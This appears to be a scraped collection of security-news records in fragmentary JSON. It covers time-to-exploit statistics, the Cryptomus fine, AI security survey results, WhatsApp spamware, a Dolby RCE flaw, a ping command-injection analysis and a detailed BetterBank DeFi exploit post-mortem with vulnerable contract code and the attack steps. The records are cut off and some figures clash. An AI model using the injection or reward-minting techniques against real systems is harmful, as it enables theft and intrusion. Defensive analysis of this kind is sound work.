Interestingly, both the average and median time to functional exploit is significantly lower than the time to PoC, but this is likely because far fewer vulnerabilities get a functional exploit, skewing the results. The average time between publication of a CVE and publication of a functional exploit is around 21 days while the median is only three days.Disclosure to known exploitation: the most significant riskMost critically, the active exploitation of a vulnerability is where we see the most significant risk. This means that the vulnerability is being leveraged in active attacks, as opposed to simply having published exploit code that may or may not function.For this analysis we looked at two data sets — the widely known CISA KEV as well as Tenable’s own Vulnerability Intelligence database, which is curated independently of CISA. For each, we looked at the average time between when a vulnerability is first disclosed and when it is identified as having known exploitation in the wild.SourceDaysAverage time to Tenable Known Exploited42Average time to CISA Known Exploited50Median time to Tenable Known Exploited5Average time to CISA Known Exploited10Source: Tenable Research, October 2025The above table reflects the fact that some CVEs skew the average number of days quite high. If we look at the median, we see it took 10 days for a CVE to be added to the CISA KEV; this means that, for those relying on NVD, a vulnerability could have been actively exploited a full five days before it appeared in the NVD.Further, based on our own tracking, we can see that active exploitation often happens even sooner than when the CVE is added to the CISA KEV catalog. The Tenable KEV shows that the median time to active exploitation for the CVEs we analyzed was only five days.The bottom line? If you are driving your vulnerability management programs off NVD you may not even be aware of the existence of a vulnerability before it is exploited in the wild.What this all means for security teamsWith time-to-exploitation taking days, not weeks, timely awareness of vulnerabilities and the risk they present is critical. Because Tenable drives its coverage directly from vendor advisories, a majority of our coverage is available within 12-24 hours of the initial disclosure of a vulnerability. This ensures that, with the exception of zero days, Tenable customers have the ability to find and remediate vulnerabilities much more quickly, thereby reducing risk. Tenable Research is constantly monitoring the threat landscape to ensure that we identify the most critical vulnerabilities — those with known active exploitation — as soon as that exploitation begins.Learn moreRelying on EDR for Exposure Management: What You Need to KnowStudy: Tenable Offers the Fastest, Broadest Coverage of CISA's KEV CatalogMind the Gap: How Waiting for NVD Puts Your Organization at Risk",
      "summary": "The article highlights the critical importance of early visibility in vulnerability management, particularly concerning the gaps between different phases of the vulnerability disclosure process. It points out that while there are several key phases in the typical vulnerability timeline, including publication of a vulnerability advisory, to National Vulnerabilities Database (NVD), and proof-of-concept (PoC) or exploitation in the wild, the average time for these processes can be significant. Specifically, it takes an average of 15 days for a CVE to appear on NVD, which leaves security teams vulnerable during this gap period. The article also emphasizes that timely awareness is crucial as active exploitation can occur rapidly, potentially before defenders are aware of the vulnerability's existence. Tenable, with its focus on vendor advisories and rapid response, provides an advantage in terms of visibility, ensuring customers have a head start over potential attackers by up to five days compared to relying solely on NVD for information.",

Between them, Apple and Google power nearly all UK mobile devices,according to the CMA:“Around 90–100% of UK mobile devices run on Apple or Google’s mobile platforms.”According to analyst datacited by the BBC, around 48.5% of British consumers use iPhones, with most of the rest on Android devices.If enforced, this change will reshape the experience of most of the smartphone users in the UK, and we have heardsimilar noises coming from the EU.Apple has pushed back, warning that EU-style regulation could limit access to new features. The company points to Apple Intelligence, which has been rolled out in other parts of the world but is not available in the EU—something Apple blames on heavy regulation.For app developers, the move could have profound effects. Smaller software makers, often frustrated by Apple’s 15–30% commission on in-app purchases, might gain alternative distribution routes. Competing app stores might offer lower fees or more flexible rules, making the app ecosystem more diverse, and potentially more affordable for users.Apple, however, argues that relaxing control could hurt users by weakening privacy standards and delaying feature updates.Security and privacyAllowing multiple app stores will undeniably reshape the iPhone’s security model. Apple’s current “closed system” approach minimizes risk by funneling all apps through its vetted App Store, where every submission goes through security reviews and malware screening. This walled approach has keptlarge-scale malware incidentson iPhones relatively rare compared to Android.It remains to be seen whether competing app stores will hold the same standards or have the resources to enforce them. Users can expect more variability in safety practices, which could increase exposure to fraudulent or malware-infested software.On the other hand, we may also see app stores that prioritize safety or cater to a more privacy-focused audience. So, it doesn’t have to be all bad—but Apple has a point when it warns about higher risk.For most users, the safest approach will be to stick with Apple’s store or other trusted marketplaces, at least in the early days. Android’s history shows that third-party app stores often become hotspots for adware and phishing, so security education is key. Regulators and developers will need to work together to make the review process and data-handling practices transparent.There is no set timeline for when or how the CMA will enforce these changes, or how far Apple will go to comply. The company could challenge the decision or introduce limited reforms.

      "content": "Financial regulators in Canada this week levied $176 million in fines againstCryptomus, a digital payments platform that supports dozens of Russian cryptocurrency exchanges and websites hawking cybercrime services. The penalties for violating Canada’s anti money-laundering laws come ten months after KrebsOnSecurity noted that Cryptomus’s Vancouver street address was home to dozens of foreign currency dealers, money transfer businesses, and cryptocurrency exchanges — none of which were physically located there.On October 16, theFinancial Transactions and Reports Analysis Center of Canada(FINTRAC) imposed a $176,960,190 penalty onXeltox Enterprises Ltd., more commonly known as the cryptocurrency payments platformCryptomus.FINTRACfoundthat Cryptomus failed to submit suspicious transaction reports in cases where there were reasonable grounds to suspect that they were related to the laundering of proceeds connected to trafficking in child sexual abuse material, fraud, ransomware payments and sanctions evasion.“Given that numerous violations in this case were connected to trafficking in child sexual abuse material, fraud, ransomware payments and sanctions evasion, FINTRAC was compelled to take this unprecedented enforcement action,” saidSarah Paquet, director and CEO at the regulatory agency.In December 2024, KrebsOnSecurity covered research by blockchain analyst and investigatorRichard Sanders, who’d spent several months signing up for various cybercrime services, and then tracking where their customer funds go from there. The122 services targeted in Sanders’s researchall used Cryptomus, and included some of the more prominent businesses advertising on the cybercrime forums, such as:-abuse-friendly or “bulletproof” hosting providers like anonvm[.]wtf, andPQHosting;-sites selling aged email, financial, or social media accounts, such as verif[.]work and kopeechka[.]store;-anonymity or “proxy” providers like crazyrdp[.]com and rdp[.]monster;-anonymous SMS services, including anonsim[.]net and smsboss[.]pro.Flymoney, one of dozens of cryptocurrency exchanges apparently nested at Cryptomus. The image from this website has been machine translated from Russian.Sanders found at least 56 cryptocurrency exchanges were using Cryptomus to process transactions, including financial entities with names like casher[.]su, grumbot[.]com, flymoney[.]biz, obama[.]ru and swop[.]is.“These platforms were built for Russian speakers, and they each advertised the ability to anonymously swap one form of cryptocurrency for another,” the December 2024 story noted. “They also allowed the exchange of cryptocurrency for cash in accounts at some of Russia’s largest banks — nearly all of which are currently sanctioned by the United States and other western nations.”Reached for comment on FINTRAC’s action, Sanders told KrebsOnSecurity he was surprised it took them so long.“I have no idea why they don’t just sanction them or prosecute them,” Sanders said. “I’m not let down with the fine amount but it’s also just going to be the cost of doing business to them.”The $173 million fine is a significant sum for FINTRAC, which imposed 23 such penalties last year totaling less than $26 million. But Sanders says FINTRAC still has much work to do in pursuing other shadowy money service businesses (MSBs) that are registered in Canada but are likely money laundering fronts for entities based in Russia and Iran.In an investigation published in July 2024,CTV National Newsand theInvestigative Journalism Foundation (IJF)documented dozens of casesacross Canada where multiple MSBs are incorporated at the same address, often without the knowledge or consent of the location’s actual occupant.Their inquiry found that the street address for Cryptomus parent Xeltox Enterprises was listed as the home of at least 76 foreign currency dealers, eight MSBs, and six cryptocurrency exchanges. At that address is a three-story building that used to be a bank and now houses a massage therapy clinic and a co-working space. But the news outlets found none of the MSBs or currency dealers were paying for services at that co-working space.The reporters also found another collection of 97 MSBs clustered at an address for a commercial office suite in Ontario, even though there was no evidence any of these companies had ever arranged for any business services at that address.",

Please let us know if you have\nfeedback\n.\nDive Brief:\nHalf of all organizations have been “negatively impacted” by security vulnerabilities in their AI systems, according to\nrecent data from EY\n.\nOnly 14% of CEOs believe their AI systems adequately protect sensitive data.\nAI’s new risks are compounding the difficulty of securing networks with a patchwork of cybersecurity defenses as organizations use an average of 47 security tools, EY found.\nDive Insight:\nEY’s new report pulls together a variety of insights about AI, from its role in the attack landscape to its integration into corporate environments. The consulting firm echoed other experts in warning that AI-powered automation is making it easier for hackers to conduct potentially costly intrusions.\n“AI lowers the bar required for cybercriminals to carry out sophisticated attacks,” Rick Hemsley, cybersecurity leader for EY in the U.K. and Ireland, said in the report. “Cyberattacking skills that used to take time and experience to develop are now more easily accessible, for free, for a greater number of cybercriminals than ever before.”\nSocial engineering\nhas benefited immensely\nfrom AI. EY noted recent CrowdStrike data showing that voice phishing, or vishing, attacks skyrocketed 442% in the second half of 2024. Cybercriminals’ breakout time — the measure of how long it takes intruders to begin moving laterally after gaining initial access — dropped from roughly an hour in 2023 to 48 minutes in 2024, according to CrowdStrike data. The security firm ReliaQuest recently found that\nit had dropped\nto just 18 minutes in the middle of 2025.\nThese figures should alarm defenders, EY said. “Accelerating breakout times are dangerous. When attackers become established in a network, they can gain deeper control and are harder to extract.”\nWith AI models introducing new risks into companies’ networks, organizations should focus on training their employees to avoid costly mistakes, EY said. The company recently found that 68% of organizations let employees develop or deploy AI agents without high-level approval, and only 60% of organizations issue guidance for that work.\nCompanies should also take steps to protect the integrity of their data, EY said, given the importance of that data to both traditional business functions and AI model training. The report noted multiple AI-related data risks, including models leaking sensitive information and companies accidentally letting models train on personally identifiable information.\nOther recommendations in EY’s report include maintaining integrity in the supply chain of AI tools, embedding security considerations into every stage of the AI development process and redesigning threat-detection programs to more quickly spot and block potential abuses of AI tools.\nCISOs should focus their security investments on “clear value-driving areas,” EY said.\npurchase licensing rights\nFiled Under:\nBreaches,\nVulnerability,\nThreats",
      "summary": "The article highlights a significant issue concerning AI security flaws affecting half of organizations worldwide. This vulnerability not only exposes sensitive data but also complicates the already challenging task of securing networks with multiple tools in place. The lack of adequate protection for sensitive information among CEOs is particularly alarming, as it indicates a widespread problem across various sectors where AI systems are integrated into their operations.\n\nThe article further emphasizes that AI-powered automation makes it easier for hackers to execute potentially costly intrusions through social engineering methods such as voice phishing (vishing), which have seen a dramatic increase due to AI advancements. The time taken by attackers to establish themselves within the network has significantly reduced, making them harder to detect and remove.\n\nEY's report suggests several measures that organizations can take to mitigate these risks, including training employees on how to handle AI-related tasks securely, ensuring proper oversight of AI agent development, and protecting data integrity during model training. Emphasizing the importance of maintaining a secure supply chain for AI tools and integrating security considerations from the initial stages of AI development is crucial. The report also calls for a reevaluation of cybersecurity investments through CISO's focus on areas that deliver clear value.",

These add-ons hijack WhatsApp Web—the browser version of WhatsApp—to automate bulk messages and skirt anti-spam controls.Spamware is software that automates the sending of unsolicited bulk messages—often for advertising, phishing, or even spreading malware—across email, messaging apps, or social media.According to Socket, the extensions inject code directly into the WhatsApp Web site, running alongside its own scripts to automate bulk outreach and scheduling. This helps them bypass WhatsApp’s anti-spam controls.The 131 extensions all share the same codebase, design patterns, and infrastructure. This is obviously a sign that something is off. If you’re proud of your product, why would you disguise it under dozens of aliases?Some marketers use WhatsApp spamware to automate and scale up outbound campaigns, flooding users with unwanted promotional messages or links. The extensions promise to help them evade WhatsApp’s built-in limits, enabling large-volume outreach that would typically be blocked if attempted manually.

      "published_date": "2025-10-22",
      "content": "Researchers from Google’sProject Zero discovereda medium-severity remote code execution (RCE) vulnerability that affects multiple platforms, including Android (Samsung and Pixel devices) and Windows. Remote code execution means an attacker could run programs on your device without your permission. The flaw, found in Dolby’s Unified Decoder Component (UDC) that handles audio playback, can be triggered automatically when a device receives an audio message—no tap or user action required.The flaw affects Android devices that use Dolby audio processing (for example, Google Pixel and Samsung smartphones) and Windows systems running Dolby UDC versions 4.5–4.13. Other vendors that integrate Dolby’s decoding capabilities may also be indirectly impacted, depending on their library updates.Tracked asCVE-2025-54957, the problem arises from the way the Dolby UDC handles “evolution data.” In the context of Dolby Digital Plus (DD+) audio streams, evolution data refers to a specialized extension block introduced in later versions of Dolby’s codecs to support additional functionality, such as higher channel counts, advanced loudness metadata, and dynamic range adjustments.Thebuffer overflowoccurs when the decoder parses the evolution data and miscalculates the size of incoming packets. Because this data block can vary in length, depending on the metadata or the embedded audio mode, the faulty length calculation can lead to insufficient buffer allocation. Malformed data can then overwrite adjacent memory and potentially allow remote code execution.Buffers are areas of memory set aside to hold data. When a buffer overflow happens, it can overwrite neighboring memory areas, which may contain other data or executable code. This overwriting is not a deliberate action by the transaction or program, but an unintended consequence of the vulnerability, which could have been prevented by bounds checking.While not every overflow carries malicious intent, the behavior of buffer overflows can be exploited. Attackers can use them to disrupt the operation of other programs, causing them to malfunction, expose secrets, or even run malicious code. In fact, buffer overflow vulnerabilities are the most common security vulnerabilities today.The vulnerability is exploitable by sending a target a specially crafted audio file. An attacker could make a phone or PC run malicious code inside the audio-decoding process, leading to crashes or unauthorized control. It’s similar to getting a song stuck in your head so badly that you can’t think of anything else and end up dancing off a cliff.The abuse of CVE-2025-54957 is not a purely hypothetical case. In its official October 14 security advisory, Dolby mentions that it is:“aware of a report found with Google Pixel devices indicating that there is a possible increased risk of vulnerability if this bug is used alongside other known Pixel vulnerabilities.

The \"ipaddress\" parameter is likely passed straight to \"ping\" in code likeping -c {count} -s {size} {ipaddress}The count and size parameters are easy to validate as they are numbers. The ipaddress parameter is likely supposed to allow for hostnames, making validation a little bit trickier. I talked at length about OS command injection and how to prevent it in a video last year (seehttps://www.youtube.com/watch?v=7QDO3pZbum8)Identifying the exact vulnerability this request attempts to exploit is not so straightforward.Searching the National Vulnerability Database (https://nvd.nist.gov) leads to two different vulnerabilities for \"webctrl.cgi\":CVE-2021-40351: webctrl.cgi.elf on Christie Digital DWU850-GS V06.46 devices allows attackers to perform any desired action via a crafted query containing an unspecified Cookie header. Authentication bypass can be achieved by including an administrative cookie that the device does not validate.CVE-2025-34033: An OS command injection vulnerability exists in the Blue Angel Software Suite running on embedded Linux devices via the ping_addr parameter in the webctrl.cgi script. The application fails to properly sanitize input before passing it to the system-level ping command.The first one refers to a cookie header. We would have an \"interesting\" cookie header, but the exploited vulnerability appears to affect the \"pingconfig_update\" action, pointing to CVE-2025-34033. However, the detailed description states:An OS command injection vulnerability exists in the Blue Angel Software Suite running on embedded Linux devices via the ping_addr parameter in the webctrl.cgi script. The application fails to properly sanitize input before passing it to the system-level ping command. An authenticated attacker can inject arbitrary commands by appending shell metacharacters to the ping_addr parameter in a crafted GET request to /cgi-bin/webctrl.cgi?action=pingtest_update. The command's output is reflected in the application's web interface, enabling attackers to view results directly. Default and backdoor credentials can be used to access the interface and exploit the issue. Successful exploitation results in arbitrary command execution as the root user.Our attack uses the 'ipaddress' parameter, not the 'ping_addr' parameter. The NVD entry also suggests this requires a GET entry and an action set to 'pingtest_update', not a POST entry with an action of 'pingconfig_update'.There are sadly many similar vulnerabilities. Many IoT/Router appliances have had vulnerabilities in their \"ping\" implementation in the past that looked exactly like what we have here. In 2019, an exploit was published for CVE-2025-34033 [1]. The vendor behind the software, 5VTech, appears to specialize in VoIP and similar equipment for Broadband networks [2].There are two options at this point: (a) this is a new version of the CVE-2025-34033 vulnerability, or (b) the attacker messed up.

      "published_date": "2025-10-22",
      "content": "Executive summaryFrom August 26 to 27, 2025, BetterBank, a decentralized finance (DeFi) protocol operating on the PulseChain network, fell victim to a sophisticated exploit involving liquidity manipulation and reward minting. The attack resulted in an initial loss of approximately $5 million in digital assets. Following on-chain negotiations, the attacker returned approximately $2.7 million in assets, mitigating the financial damage and leaving a net loss of around $1.4 million. The vulnerability stemmed from a fundamental flaw in the protocol’s bonus reward system, specifically in theswapExactTokensForFavorAndTrackBonusfunction. This function was designed to mint ESTEEM reward tokens whenever a swap resulted in FAVOR tokens, but critically, it lacked the necessary validation to ensure that the swap occurred within a legitimate, whitelisted liquidity pool.A prior security audit by Zokyo had identified and flagged this precise vulnerability. However, due to adocumented communication breakdownand the vulnerability’s perceived low severity, the finding was downgraded, and the BetterBank development team did not fully implement the recommended patch. This incident is a pivotal case study demonstrating how design-level oversights, compounded by organizational inaction in response to security warnings, can lead to severe financial consequences in the high-stakes realm of blockchain technology. The exploit underscores the importance of thorough security audits, clear communication of findings, and multilayered security protocols to protect against increasingly sophisticated attack vectors.In this article, we will analyze the root cause, impact, and on-chain forensics of the helper contracts used in the attack.Incident overviewIncident timelineThe BetterBank exploit was the culmination of a series of events that began well before the attack itself. In July 2025, approximately one month prior to the incident, the BetterBank protocol underwent a security audit conducted by the firm Zokyo. The audit report,which was made public after the exploit, explicitly identified a critical vulnerability related to the protocol’s bonus system. Titled “A Malicious User Can Trade Bogus Tokens To Qualify For Bonus Favor Through The UniswapWrapper,” the finding was a direct warning about the exploit vector that would later be used. However, based on the documented proof of concept (PoC), which used test Ether, the severity of the vulnerability was downgraded to “Informational” and marked as “Resolved” in the report. The BetterBank team did not fully implement the patched code snippet.The attack occurred on August 26, 2025. In response, the BetterBank team drained all remaining FAVOR liquidity pools to protect the assets that had not yet been siphoned. The team also took the proactive step of announcing a 20% bounty for the attacker and attempted to negotiate the return of funds.Remarkably, these efforts were successful. On August 27, 2025, the attacker returned a significant portion of the stolen assets – 550 million DAI tokens. This partial recovery is not a common outcome in DeFi exploits.Financial impactThis incident had a significant financial impact on the BetterBank protocol and its users. Approximately $5 million worth of assets was initially drained. The attack specifically targeted liquidity pools, allowing the perpetrator to siphon off a mix of stablecoins and native PulseChain assets. The drained assets included 891 million DAI tokens, 9.05 billion PLSX tokens, and 7.40 billion WPLS tokens.In a positive turn of events, the attacker returned approximately $2.7 million in assets, specifically 550 million DAI. These funds represented a significant portion of the initial losses, resulting in a final net loss of around $1.4 million. This figure speaks to the severity of the initial exploit and the effectiveness of the team’s recovery efforts. While data from various sources show minor fluctuations in reported values due to real-time token price volatility, they consistently point to these key figures.A detailed breakdown of the losses and recovery is provided in the following table:Financial MetricValueDetailsInitial Total Loss~$5,000,000The total value of assets drained during the exploit.Assets Drained891M DAI, 9.05B PLSX, 7.40B WPLSThe specific tokens and quantities siphoned from the protocol’s liquidity pools.Assets Returned~$2,700,000 (550M DAI)The value of assets returned by the attacker following on-chain negotiations.Net Loss~$1,400,000The final, unrecovered financial loss to the protocol and its users.Protocol description and vulnerability analysisThe BetterBank protocol is a decentralized lending platform on the PulseChain network. It incorporates a two-token system that incentivizes liquidity provision and engagement. The primary token is FAVOR, while the second, ESTEEM, acts as a bonus reward token. The protocol’s core mechanism for rewarding users was tied to providing liquidity for FAVOR on decentralized exchanges (DEXs). Specifically, a function was designed to mint and distribute ESTEEM tokens whenever a trade resulted in FAVOR as the output token. While seemingly straightforward, this incentive system contained a critical design flaw that an attacker would later exploit.The vulnerability was not a mere coding bug, but a fundamental architectural misstep. By tying rewards to a generic, unvalidated condition – the appearance of FAVOR in a swap’s output – the protocol created an exploitable surface. Essentially, this design choice trusted all external trading environments equally and failed to anticipate that a malicious actor could replicate a trusted environment for their own purposes. This is acommon failure in tokenomics, where the focus on incentivization overlooks the necessary security and validation mechanisms that should accompany the design of such features.The technical root cause of the vulnerability was a fundamental logic flaw in one of BetterBank’s smart contracts. The vulnerability was centered on theswapExactTokensForFavorAndTrackBonusfunction. The purpose of this function was to track swaps and mint ESTEEM bonuses. However, its core logic was incomplete: it only verified that FAVOR was the output token from the swap and failed to validate the source of the swap itself. The contract did not check whether the transaction originated from a legitimate, whitelisted liquidity pool or a registered contract. This lack of validation created a loophole that allowed an attacker to trigger the bonus system at will by creating a fake trading environment.This primary vulnerability was compounded by a secondary flaw in the protocol’s tokenomics: the flawed design of convertible rewards.The ESTEEM tokens, minted as a bonus, could be converted back into FAVOR tokens. This created a self-sustaining feedback loop. An attacker could trigger theswapExactTokensForFavorAndTrackBonusfunction to mint ESTEEM, and then use those newly minted tokens to obtain more FAVOR. The FAVOR could then be used in subsequent swaps to mint even more ESTEEM rewards. This cyclical process enabled the attacker to generate an unlimited supply of tokens and drain the protocol’s real reserves. The synergistic combination of logic and design flaws created a high-impact attack vector that was difficult to contain once initiated.To sum it up, the BetterBank exploit was the result of a critical vulnerability in the bonus minting system that allowed attackers to create fake liquidity pairs and harvest an unlimited amount of ESTEEM token rewards. As mentioned above, the system couldn’t distinguish between legitimate and malicious liquidity pairs, creating an opportunity for attackers to generate illegitimate token pairs. The BetterBank system included protection measures against attacks capable of inflicting substantial financial damage – namely a sell tax. However, the threat actors were able to bypass this tax mechanism, which exacerbated the impact of the attack.Exploit breakdownThe exploit targeted the bonus minting system of thefavorPLS.solcontract, specifically thelogBuy()function and related tax logic. The key vulnerable components are:File:favorPLS.solVulnerable function:logBuy(address user, uint256 amount)Supporting function:calculateFavorBonuses(uint256 amount)Tax logic:_transfer()functionThelogBuyfunction only checks if the caller is an approved buy wrapper; it doesn’t validate the legitimacy of the trading pair or liquidity source.function logBuy(address user, uint256 amount) external {\n    require(isBuyWrapper[msg.sender], \"Only approved buy wrapper can log buys\");\n\n    (uint256 userBonus, uint256 treasuryBonus) = calculateFavorBonuses(amount);\n    pendingBonus[user] += userBonus;\n\n    esteem.mint(treasury, treasuryBonus);\n    emit EsteemBonusLogged(user, userBonus, treasuryBonus);The tax only applies to transfers to legitimate, whitelisted addresses that are marked asisMarketPair[recipient]. By definition, fake, unauthorized LPs are not included in this mapping, so they bypass the maximum 50% sell tax imposed by protocol owners.function _transfer(address sender, address recipient, uint256 amount) internal override {\n    uint256 taxAmount = 0;\n\n    if (_isTaxExempt(sender, recipient)) {\n        super._transfer(sender, recipient, amount);\n        return;\n    }\n\n    // Transfer to Market Pair is likely a sell to be taxed\n    if (isMarketPair[recipient]) {\n        taxAmount = (amount * sellTax) / MULTIPLIER;\n    }\n\n    if (taxAmount > 0) {\n        super._transfer(sender, treasury, taxAmount);\n        amount -= taxAmount;\n    }\n\n    super._transfer(sender, recipient, amount);\n}TheuniswapWraper.solcontract contains the buy wrapper functions that calllogBuy(). The system only checks if the pair is inallowedDirectPairmapping, but this can be manipulated by creating fake tokens and adding them to the mapping to get them approved.function swapExactTokensForFavorAndTrackBonus(\n    uint amountIn,\n    uint amountOutMin,\n    address[] calldata path,\n    address to,\n    uint256 deadline\n) external {\n    address finalToken = path[path.length - 1];\n    require(isFavorToken[finalToken], \"Path must end in registered FAVOR\");\n    require(allowedDirectPair[path[0]][finalToken], \"Pair not allowed\");\n    require(path.length == 2, \"Path must be direct\");\n\n    // ... swap logic ...\n\n    uint256 twap = minterOracle.getTokenTWAP(finalToken);\n    if(twap < 3e18){\n        IFavorToken(finalToken).logBuy(to, favorReceived);\n    }\n}Step-by-step attack reconstructionThe attack on BetterBank was not a single transaction, but rather a carefully orchestrated sequence of on-chain actions. The exploit began with the attacker acquiring the necessary capital through a flash loan. Flash loans are a feature of many DeFi protocols that allow a user to borrow large sums of assets without collateral, provided the loan is repaid within the same atomic transaction. The attacker used the loan to obtain a significant amount of assets, which were then used to manipulate the protocol’s liquidity pools.The attacker used the flash loan funds to target and drain the real DAI-PDAIF liquidity pool, a core part of the BetterBank protocol. This initial step was crucial because it weakened the protocol’s defenses and provided the attacker with a large volume of PDAIF tokens, which were central to the reward-minting scheme.Capital acquisitionAfter draining the real liquidity pool, the attacker moved to the next phase of the operation. They deployed a new, custom, and worthless ERC-20 token. Exploiting the permissionless nature of PulseX, the attacker then created a fake liquidity pool, pairing their newly created bogus token with PDAIF.This fake pool was key to the entire exploit. It enabled the attacker to control both sides of a trading pair and manipulate the price and liquidity to their advantage without affecting the broader market.One critical element that made this attack profitable was the protocol’s tax logic. BetterBank had implemented a system that levied high fees on bulk swaps to deter this type of high-volume trading. However, the tax only applied to “official” or whitelisted liquidity pairs. Since the attacker’s newly created pool was not on this list, they were able to conduct their trades without incurring any fees. This critical loophole ensured the attack’s profitability.Fake LP pair creationAfter establishing the bogus token and fake liquidity pool, the attacker initiated the final and most devastating phase of the exploit: the reward minting loop. They executed a series of rapid swaps between their worthless token and PDAIF within their custom-created pool. Each swap triggered the vulnerableswapExactTokensForFavorAndTrackBonusfunction in the BetterBank contract. Because the function did not validate the pool, it minted a substantial bonus of ESTEEM tokens with each swap, despite the illegitimacy of the trading pair.Each swap triggers:swapExactTokensForFavorAndTrackBonus()logBuy()function callcalculateFavorBonuses()executionESTEEM token minting (44% bonus)fake LP sell tax bypassReward minting loopThe newly minted ESTEEM tokens were then converted back into FAVOR tokens, which could be used to facilitate more swaps. This created a recursive loop that allowed the attacker to generate an immense artificial supply of rewards and drain the protocol’s real asset reserves. Using this method, the attacker extracted approximately 891 million DAI, 9.05 billion PLSX, and 7.40 billion WPLS, effectively destabilizing the entire protocol. The success of this multi-layered attack demonstrates how a single fundamental logic flaw, combined with a series of smaller design failures, can lead to a catastrophic outcome.Economic impact comparisonMitigation strategyThis attack could have been averted if a number of security measures had been implemented.First, the liquidity pool should be verified during a swap. The LP pair and liquidity source must be valid.function logBuy(address user, uint256 amount) external {\n    require(isBuyWrapper[msg.sender], \"Only approved buy wrapper can log buys\");\n    \n    //  ADD: LP pair validation\n    require(isValidLPPair(msg.sender), \"Invalid LP pair\");\n    require(hasMinimumLiquidity(msg.sender), \"Insufficient liquidity\");\n    require(isVerifiedPair(msg.sender), \"Unverified trading pair\");\n    \n    //  ADD: Amount limits\n    require(amount <= MAX_SWAP_AMOUNT, \"Amount exceeds limit\");\n    \n    (uint256 userBonus, uint256 treasuryBonus) = calculateFavorBonuses(amount);\n    pendingBonus[user] += userBonus;\n    \n    esteem.mint(treasury, treasuryBonus);\n    emit EsteemBonusLogged(user, userBonus, treasuryBonus);\n}The sell tax should be applied to all transfers.function _transfer(address sender, address recipient, uint256 amount) internal override {\n    uint256 taxAmount = 0;\n    \n    if (_isTaxExempt(sender, recipient)) {\n        super._transfer(sender, recipient, amount);\n        return;\n    }\n    \n    //  FIX: Apply tax to ALL transfers, not just market pairs\n    if (isMarketPair[recipient] || isUnverifiedPair(recipient)) {\n        taxAmount = (amount * sellTax) / MULTIPLIER;\n    }\n    \n    if (taxAmount > 0) {\n        super._transfer(sender, treasury, taxAmount);\n        amount -= taxAmount;\n    }\n    \n    super._transfer(sender, recipient, amount);\n}To prevent large-scale one-time attacks, a daily limit should be introduced to stop users from conducting transactions totaling more than 10,000 ESTEEM tokens per day.mapping(address => uint256) public lastBonusClaim;\nmapping(address => uint256) public dailyBonusLimit;\nuint256 public constant MAX_DAILY_BONUS = 10000 * 1e18; // 10K ESTEEM per day\n\nfunction logBuy(address user, uint256 amount) external {\n    require(isBuyWrapper[msg.sender], \"Only approved buy wrapper can log buys\");\n    \n    //  ADD: Rate limiting\n    require(block.timestamp - lastBonusClaim[user] > 1 hours, \"Rate limited\");\n    require(dailyBonusLimit[user] < MAX_DAILY_BONUS, \"Daily limit exceeded\");\n    \n    // Update rate limiting\n    lastBonusClaim[user] = block.timestamp;\n    dailyBonusLimit[user] += calculatedBonus;\n    \n    // ... rest of function\n}On-chain forensics and fund tracingThe on-chain trail left by the attacker provides a clear forensic record of the exploit. After draining the assets on PulseChain, the attacker swapped the stolen DAI, PLSX, and WPLS for more liquid, cross-chain assets. The perpetrator then bridged approximately $922,000 worth of ETH from the PulseChain network to the Ethereum mainnet. This was done using a secondary attacker address beginning with 0xf3BA…, which was likely created to hinder exposure of the primary exploitation address. The final step in the money laundering process was the use of a crypto mixer, such as Tornado Cash, to obscure the origin of the funds and make them untraceable.Tracing the flow of these funds was challenging because many public-facing block explorers for the PulseChain network were either inaccessible or lacked comprehensive data at the time of the incident. This highlights the practical difficulties associated with on-chain forensics, where the lack of a reliable, up-to-date block explorer can greatly hinder analysis. In these scenarios, it becomes critical to use open-source explorers like Blockscout, which are more resilient and transparent.The following table provides a clear reference for the key on-chain entities involved in the attack:On-Chain EntityAddressDescriptionPrimary Attacker EOA0x48c9f537f3f1a2c95c46891332E05dA0D268869BThe main externally owned account used to initiate the attack.Secondary Attacker EOA0xf3BA0D57129Efd8111E14e78c674c7c10254acAEThe address used to bridge assets to the Ethereum network.Attacker Helper Contracts0x792CDc4adcF6b33880865a200319ecbc496e98f8, etc.A list of contracts deployed by the attacker to facilitate the exploit.PulseXRouter020x165C3410fC91EF562C50559f7d2289fEbed552d9The PulseX decentralized exchange router contract used in the exploit.We managed to get hold of the attacker’s helper contracts to deepen our investigation. Through comprehensive bytecode analysis and contract decompilation, we determined that the attack architecture was multilayered. The attack utilized a factory contract pattern (0x792CDc4adcF6b33880865a200319ecbc496e98f8) that contained 18,219 bytes of embedded bytecode that were dynamically deployed during execution. The embedded contract revealed three critical functions: two simple functions (0x51cff8d9and0x529d699e) for initialization and cleanup, and a highly complex flash loan callback function (0x920f5c84) with the signatureexecuteOperation(address[],uint256[],uint256[],address,bytes), which matches standard DeFi flash loan protocols like Aave and dYdX. Analysis of the decompiled code revealed that the executeOperation function implements sophisticated parameter parsing for flash loan callbacks, dynamic contract deployment capabilities, and complex external contract interactions with the PulseX Router (0x165c3410fc91ef562c50559f7d2289febed552d9).contract BetterBankExploitContract {\n    \n    function main() external {\n        // Initialize memory\n        assembly {\n            mstore(0x40, 0x80)\n        }\n        \n        // Revert if ETH is sent\n        if (msg.value > 0) {\n            revert();\n        }\n        \n        // Check minimum calldata length\n        if (msg.data.length < 4) {\n            revert();\n        }\n        \n        // Extract function selector\n        uint256 selector = uint256(msg.data[0:4]) >> 224;\n        \n        // Dispatch to appropriate function\n        if (selector == 0x51cff8d9) {\n            // Function: withdraw(address)\n            withdraw();\n        } else if (selector == 0x529d699e) {\n            // Function: likely exploit execution\n            executeExploit();\n        } else if (selector == 0x920f5c84) {\n            // Function:  executeOperation(address[],uint256[],uint256[],address,bytes)\n            // This is a flash loan callback function!\n            executeOperation();\n        } else {\n            revert();\n        }\n    }\n    \n    // Function 0x51cff8d9 - Withdraw function\n    function withdraw() internal {\n        // Implementation would be in the bytecode\n        // Likely withdraws profits to attacker address\n    }\n    \n    // Function 0x529d699e - Main exploit function\n    function executeExploit() internal {\n        // Implementation would be in the bytecode\n        // Contains the actual BetterBank exploit logic\n    }\n    \n    // Function 0x920f5c84 - Flash loan callback\n    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) internal {\n        // This is the flash loan callback function\n        // Contains the exploit logic that runs during flash loan\n    }\n}The attack exploited three critical vulnerabilities in BetterBank’s protocol: unvalidated reward minting in thelogBuyfunction that failed to verify legitimate trading pairs; a tax bypass mechanism in the_transferfunction that only applied the 50% sell tax to addresses marked as market pairs; and oracle manipulation through fake trading volume. The attacker requested flash loans of 50M DAI and 7.14B PLP tokens, drained real 